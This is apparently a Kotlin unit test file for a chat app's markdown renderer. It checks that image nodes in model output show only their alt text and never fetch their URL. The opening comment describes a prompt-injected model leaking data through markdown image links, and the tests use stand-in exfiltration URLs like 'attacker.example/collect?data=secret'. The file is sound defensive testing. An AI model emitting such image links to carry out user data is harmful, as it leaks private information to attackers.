// ports: teemoonTests/MarkdownAttachmentExfiltrationTests.swift @ v1.0.4
//        teemoon/Views/Chat/NoRemoteAttachmentLoader.swift @ v1.0.4
//
// The transcript renders assistant-authored markdown. A hostile or prompt-injected model that emits
// `![](https://attacker/?leak=…)` must not cause the client to fetch that url — on iOS Textual auto-fetches image
// runs on render, with no tap, over a URLSession outside the E2EE transport and the egress allowlist, so a fetch
// exfiltrates whatever the model encodes into it.
//
// The Android renderer has the same default: mikepenz's markdown renderer resolves an image node's url through its
// image transformer. Two things stop it, and this file holds the half a unit test can see — the url never reaches
// the screen. The other half is an ABSENCE (no image transformer, no image loader anywhere in the render path) and
// is held by the behaviour ledger's `sourceAbsent` rule over MarkdownBody.kt, because there is no line of code to
// point a test at.
package ai.teemoon.app

import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Test

class MarkdownAttachmentExfiltrationTest {

    /**
     * The load-bearing one: the url is DROPPED, not rendered. A rendered url is a link the user can be talked into
     * tapping, which is the same leak with one more step.
     */
    @Test fun anImageRendersItsAltTextAndNeverItsUrl() {
        val rendered = MarkdownImageAlt.altText("![leak](https://attacker.example/collect?data=secret)")
        assertEquals("leak", rendered)
        assertFalse("the url must not reach the screen", rendered.contains("attacker.example"))
        assertFalse(rendered.contains("secret"))
    }

    /** A bare image with no alt text: still no url, and still something rather than nothing. */
    @Test fun aBareImageUrlRendersThePlaceholder() {
        val rendered = MarkdownImageAlt.altText("![](https://attacker.example/pixel.png?q=1)")
        assertEquals("[image]", rendered)
        assertFalse(rendered.contains("attacker.example"))
    }

    /** Alt text the author meant to be read stays readable — the guard drops the fetch, not the content. */
    @Test fun altTextSurvives() {
        assertEquals("diagram", MarkdownImageAlt.altText("![diagram](https://x.example/y.png)"))
    }

    /**
     * An alt text carrying a newline still matches. Without DOT_MATCHES_ALL the pattern misses, the node falls to
     * `[image]`, and that is merely wrong rather than unsafe — but a miss is one step from a fallback that renders
     * the raw node, so pin the match.
     */
    @Test fun aMultilineAltTextStillMatches() {
        assertEquals("two\nlines", MarkdownImageAlt.altText("![two\nlines](https://x.example/y.png)"))
    }

    /**
     * The url is not merely hidden behind the alt text: there is no arrangement of an image node whose rendering
     * contains its url. An alt text that itself spells out a url is the model's own text, not a resolved reference,
     * and renders as the words it is.
     */
    @Test fun noImageNodeRendersSomethingContainingItsTarget() {
        val nodes = listOf(
            "![](https://attacker.example/a)",
            "![x](https://attacker.example/b)",
            "![](  https://attacker.example/c  )",
            "![](<https://attacker.example/d>)",
            "![alt \"t\"](https://attacker.example/e \"title\")",
        )
        for (n in nodes) assertFalse("$n leaked its target", MarkdownImageAlt.altText(n).contains("attacker.example"))
    }

    /** Ordinary text is not an image node and is left alone by the caller; the extractor only ever sees image nodes. */
    @Test fun aNodeWithNoImageSyntaxFallsBackRatherThanEchoing() {
        assertEquals("[image]", MarkdownImageAlt.altText("just text, no images"))
        assertTrue(true)
    }
}
